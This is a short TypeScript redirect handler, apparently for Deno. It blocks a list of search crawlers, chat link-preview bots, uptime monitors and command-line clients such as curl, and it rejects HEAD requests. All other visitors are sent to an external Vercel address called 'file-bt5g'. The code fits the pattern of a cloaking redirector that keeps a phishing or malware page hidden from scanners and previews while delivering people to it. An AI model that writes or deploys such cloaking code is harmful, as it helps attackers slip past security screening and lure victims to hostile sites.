// redirect.ts

// URL to redirect humans to
const redirectUrl = "https://file-bt5g.vercel.app"; // IMPORTANT: added missing ":" after http

// List of known bot/crawler User-Agents to block
const blockedBots = [
  "googlebot",
  "bingbot",
  "slackbot",
  "facebookexternalhit",
  "facebot",
  "twitterbot",
  "whatsapp",
  "linkedinbot",
  "skypeuripreview",
  "discordbot",
  "telegrambot",
  "python-requests",
  "curl",
  "ahrefsbot",
  "semrushbot",
  "mj12bot",
  "uptimerobot",
  "pingdom",
  "crawler",
  "spider",
  "bot"
];

// Handle incoming request
addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request: Request): Promise<Response> {
  const userAgent = (request.headers.get("user-agent") || "").toLowerCase();

  // 1️⃣ Block Common Bots
  for (const bot of blockedBots) {
    if (userAgent.includes(bot)) {
      return new Response("Blocked", { status: 403 });
    }
  }

  // 2️⃣ Optional: Block visitors with no JavaScript (bots)
  // If Deno receives HEAD request, it's almost always a bot preview
  if (request.method === "HEAD") {
    return new Response("Bot Blocked", { status: 403 });
  }

  // 3️⃣ Redirect Humans
  return Response.redirect(redirectUrl, 302);
}
